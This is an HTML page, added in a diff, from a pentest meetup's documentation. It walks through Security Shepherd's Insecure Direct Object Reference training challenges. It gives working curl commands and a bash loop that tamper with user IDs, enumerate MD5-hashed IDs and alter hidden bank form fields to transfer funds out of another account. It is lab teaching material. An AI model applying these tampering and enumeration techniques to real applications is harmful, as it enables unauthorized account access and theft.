@@ -1,0 +1,445 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.15.7. Insecure Direct Object References &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="3.15. Security Shepherd Web App Levels" href="security_shepherd.html"/>
+        <link rel="next" title="3.15.8. Session Management" href="security_shepherd_session_management.html"/>
+        <link rel="prev" title="3.15.6. Insecure Cryptographic Storage" href="security_shepherd_crypto_storage.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_intro.html">3.15.1. Security Shepherd Introduction</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_lessons.html">3.15.2. Lessons</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_csrf.html">3.15.3. CSRF</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_url_access.html">3.15.4. Failure to Restrict URL Access</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_injection.html">3.15.5. Injection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_crypto_storage.html">3.15.6. Insecure Cryptographic Storage</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">3.15.7. Insecure Direct Object References</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#insecure-direct-object-reference-challenge-1">3.15.7.1. Insecure Direct Object Reference Challenge 1</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#insecure-direct-object-reference-challenge-2">3.15.7.2. Insecure Direct Object Reference Challenge 2</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#insecure-direct-object-reference-bank">3.15.7.3. Insecure Direct Object Reference Bank</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_session_management.html">3.15.8. Session Management</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_xss.html">3.15.9. XSS</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+          <li><a href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a> &raquo;</li>
+        
+      <li>3.15.7. Insecure Direct Object References</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/security_shepherd_direct_ref.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="insecure-direct-object-references">
+<span id="securityshepherddirectobjref"></span><h1>3.15.7. Insecure Direct Object References<a class="headerlink" href="#insecure-direct-object-references" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="insecure-direct-object-reference-challenge-1">
+<h2>3.15.7.1. Insecure Direct Object Reference Challenge 1<a class="headerlink" href="#insecure-direct-object-reference-challenge-1" title="Permalink to this headline">¶</a></h2>
+<p>Use Tamper Data to view the request for one of the existing users (say “Ronan Fitzpatrick”). The “userId[]” appears to be a simple integer. Setting the “userId[]” post parameter to 0, 1, 2, … eventually displays the result key at 11.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, URL, and POSTDATA.</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=17B9319686957844C9ABC20783F71EB8; token=-151992892046487776536066712571995351801; JSESSIONID3=&quot;XHAMNIXS+EtfXshD4Kgjvw==&quot;&#39;</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c&#39;</span>
+
+curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data-urlencode userId<span class="o">[]=</span><span class="m">11</span> <span class="se">\</span>
+     <span class="nv">$URL</span> <span class="se">\</span>
+  <span class="p">|</span> sed -ne <span class="s1">&#39;s/^.*\(Result Key is \)&lt;a&gt;\(.*\)&lt;\/a&gt;.*$/\1\2\n/p&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Result Key is</span>
+</span><span class="hll"><span class="go">dd6301b38b5ad9c54b85d07c087aebec89df8b8c769d4da084a55663e6186742</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="insecure-direct-object-reference-challenge-2">
+<h2>3.15.7.2. Insecure Direct Object Reference Challenge 2<a class="headerlink" href="#insecure-direct-object-reference-challenge-2" title="Permalink to this headline">¶</a></h2>
+<p>Use Tamper Data to view the request for one of the existing users (say “Ronan Fitzpatrick”). The userId post parameter is “8f14e45fceea167a5a36dedd4bea2543” which an Internet search reveals this is the MD5 hash of 7. So the un-hashed userId[]” appears to be a simple integer. We created the bash script below to loop from 0, … to look up users using the MD5 hash of the index.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, URL, and POSTDATA.</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=17B9319686957844C9ABC20783F71EB8; token=-151992892046487776536066712571995351801; JSESSIONID3=&quot;XHAMNIXS+EtfXshD4Kgjvw==&quot;&#39;</span>
+<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4&#39;</span>
+
+<span class="k">for</span> i in <span class="o">{</span><span class="m">0</span>..20..1<span class="o">}</span><span class="p">;</span> <span class="k">do</span>
+  <span class="nv">HASH</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$i</span><span class="s2">&quot;</span> <span class="p">|</span> md5sum <span class="p">|</span> sed <span class="s1">&#39;s/ .*$//&#39;</span><span class="k">)</span><span class="s2">&quot;</span>
+  <span class="nv">RESULT</span><span class="o">=</span><span class="k">$(</span>curl --silent --insecure <span class="se">\</span>
+       --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+       --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+       --data-urlencode <span class="s2">&quot;userId[]=</span><span class="nv">$HASH</span><span class="s2">&quot;</span> <span class="se">\</span>
+       <span class="nv">$URL</span> <span class="se">\</span>
+    <span class="p">|</span> sed -ne <span class="s1">&#39;s/^.*\(Result Key is \)&lt;a&gt;\(.*\)&lt;\/a&gt;.*$/\1\2\n/p&#39;</span><span class="k">)</span>
+   <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$RESULT</span><span class="s2">&quot;</span> <span class="o">=</span>~ <span class="s2">&quot;Result Key is&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+     <span class="nb">echo</span> <span class="s2">&quot;Match found on id </span><span class="nv">$i</span><span class="s2">&quot;</span>
+     <span class="nb">echo</span> <span class="nv">$RESULT</span>
+     <span class="nb">break</span>
+   <span class="k">fi</span>
+<span class="k">done</span>
+</pre></div>
+</div>
+<p>Running this gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Match found on id 13</span>
+</span><span class="hll"><span class="go">Result Key is</span>
+</span><span class="hll"><span class="go">1f746b87a4e3628b90b1927de23f6077abdbbb64586d3ac9485625da21921a0f</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="insecure-direct-object-reference-bank">
+<h2>3.15.7.3. Insecure Direct Object Reference Bank<a class="headerlink" href="#insecure-direct-object-reference-bank" title="Permalink to this headline">¶</a></h2>
+<p>The solution to this challenge hinges on the “hidden” form fields specifying the account number which can be tampered with to affect another account. We do this exercise almost predominantly in <strong class="program">curl</strong>, though the web page could be used as-is except for these 2 requests: <span class="guilabel">Refresh Balance</span> must tamper the currentAccountNumber=1, and <span class="guilabel">Transfer Funds</span> must tamper the senderAccountNumber=1 and recieverAccountNumber=2. Read on for the <strong class="program">curl</strong> solution.</p>
+<p>Between Tamper Data and Firebug we get the following information:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data</span>
+<span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;JSESSIONID=17B9319686957844C9ABC20783F71EB8; token=-151992892046487776536066712571995351801; JSESSIONID3=&quot;XHAMNIXS+EtfXshD4Kgjvw==&quot;&#39;</span>
+<span class="c1"># Firebug gets registration, signin, refresh balance, transfer</span>
+<span class="nv">SITE</span><span class="o">=</span>https://securityshepherd.com
+<span class="nv">URL_REG</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">&quot;</span><span class="s1">&#39;/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cReg&#39;</span>
+<span class="nv">URL_SIGNIN</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">&quot;</span><span class="s1">&#39;/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c&#39;</span>
+<span class="nv">URL_REFRESH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">&quot;</span><span class="s1">&#39;/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cCurrentBalance&#39;</span>
+<span class="nv">URL_TRANSFER</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SITE</span><span class="s2">&quot;</span><span class="s1">&#39;/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cTransfer&#39;</span>
+</pre></div>
+</div>
+<p>Using this information we can create an account for hacker with password = password:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;accountHolder=hacker&amp;accountPass=password&#39;</span>
+curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data <span class="nv">$POSTDATA</span> <span class="se">\</span>
+     <span class="nv">$URL_REG</span>
+</pre></div>
+</div>
+<p>Then sign into the account:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data <span class="nv">$POSTDATA</span> <span class="se">\</span>
+     <span class="nv">$URL_SIGNIN</span>
+</pre></div>
+</div>
+<p>Return page shows we are account #2:</p>
+<div class="highlight-html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;hidden&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;2&#39;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;currentAccountNumber&#39;</span><span class="p">&gt;</span>
+</pre></div>
+</div>
+<p>Then get the 0 balance for account 2:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">ACCOUNT</span><span class="o">=</span><span class="m">2</span>
+<span class="nv">POSTDATA</span><span class="o">=</span><span class="s2">&quot;accountNumber=</span><span class="nv">$ACCOUNT</span><span class="s2">&quot;</span>
+curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data <span class="nv">$POSTDATA</span> <span class="se">\</span>
+     <span class="nv">$URL_REFRESH</span>
+</pre></div>
+</div>
+<p>Now try to get the account balance for account 1 (10,000,000):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">ACCOUNT</span><span class="o">=</span><span class="m">1</span>
+<span class="nv">POSTDATA</span><span class="o">=</span><span class="s2">&quot;accountNumber=</span><span class="nv">$ACCOUNT</span><span class="s2">&quot;</span>
+curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data <span class="nv">$POSTDATA</span> <span class="se">\</span>
+     <span class="nv">$URL_REFRESH</span>
+</pre></div>
+</div>
+<p>They have too much money, so transfer 6,000,000 to your account:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VICTIM</span><span class="o">=</span><span class="m">1</span>
+<span class="nv">RECEIVER</span><span class="o">=</span><span class="m">2</span>
+<span class="nv">AMOUNT</span><span class="o">=</span><span class="m">6000000</span>
+<span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;senderAccountNumber=&#39;</span><span class="s2">&quot;</span><span class="nv">$VICTIM</span><span class="s2">&quot;</span><span class="s1">&#39;&amp;recieverAccountNumber=&#39;</span><span class="s2">&quot;</span><span class="nv">$RECEIVER</span><span class="s2">&quot;</span><span class="s1">&#39;&amp;transferAmount=&#39;</span><span class="s2">&quot;</span><span class="nv">$AMOUNT</span><span class="s2">&quot;</span>
+curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data <span class="nv">$POSTDATA</span> <span class="se">\</span>
+     <span class="nv">$URL_TRANSFER</span>
+</pre></div>
+</div>
+<p>View the transfer results (account balance now 6,000,000):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">ACCOUNT</span><span class="o">=</span><span class="m">2</span>
+<span class="nv">POSTDATA</span><span class="o">=</span><span class="s2">&quot;accountNumber=</span><span class="nv">$ACCOUNT</span><span class="s2">&quot;</span>
+curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data <span class="nv">$POSTDATA</span> <span class="se">\</span>
+     <span class="nv">$URL_REFRESH</span>
+</pre></div>
+</div>
+<p>Sign back on to get the result key:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;accountHolder=hacker&amp;accountPass=password&#39;</span>
+<span class="nv">RESULT</span><span class="o">=</span><span class="k">$(</span>curl --silent --insecure <span class="se">\</span>
+     --header <span class="s2">&quot;X-Requested-With: XMLHttpRequest&quot;</span> <span class="se">\</span>
+     --cookie <span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
+     --data <span class="nv">$POSTDATA</span> <span class="se">\</span>
+     <span class="nv">$URL_SIGNIN</span> <span class="se">\</span>
+ <span class="p">|</span> sed -ne <span class="s1">&#39;s/^.*\(The result key for this challenge is \)&lt;a&gt;\(.*\)&lt;\/a&gt;.*$/\1\2\n/p&#39;</span><span class="k">)</span>
+<span class="nb">echo</span> <span class="nv">$RESULT</span>
+</pre></div>
+</div>
+<p>We get the result key:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key for this challenge is</span>
+</span><span class="hll"><span class="go">lu6Lpa8TBMtUeHg&amp;#x2b;2DC4aSvS4YfUsDYf0GkRhKmEch1TYApi7zsBn8fi6T3efhgNypOtdrO1pnf80steIRH9tJlc0CpEey3V&amp;#x2f;fokZqfWwiMiOFsFf81j17VqyhK4jLI51uj0HH9TtnM4VZNUB7Y7Gg&amp;#x3d;&amp;#x3d;</span>
+</span></pre></div>
+</div>
+<p>The result key contains encoded data: “&amp;#x2b;” = “+”, “&amp;#x2f;” = “/”, and “&amp;#x3d;” = “=”. The decoded result key is:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">lu6Lpa8TBMtUeHg+2DC4aSvS4YfUsDYf0GkRhKmEch1TYApi7zsBn8fi6T3efhgNypOtdrO1pnf80steIRH9tJlc0CpEey3V/fokZqfWwiMiOFsFf81j17VqyhK4jLI51uj0HH9TtnM4VZNUB7Y7Gg==</span>
+</span></pre></div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="security_shepherd_session_management.html" class="btn btn-neutral float-right" title="3.15.8. Session Management" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="security_shepherd_crypto_storage.html" class="btn btn-neutral" title="3.15.6. Insecure Cryptographic Storage" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
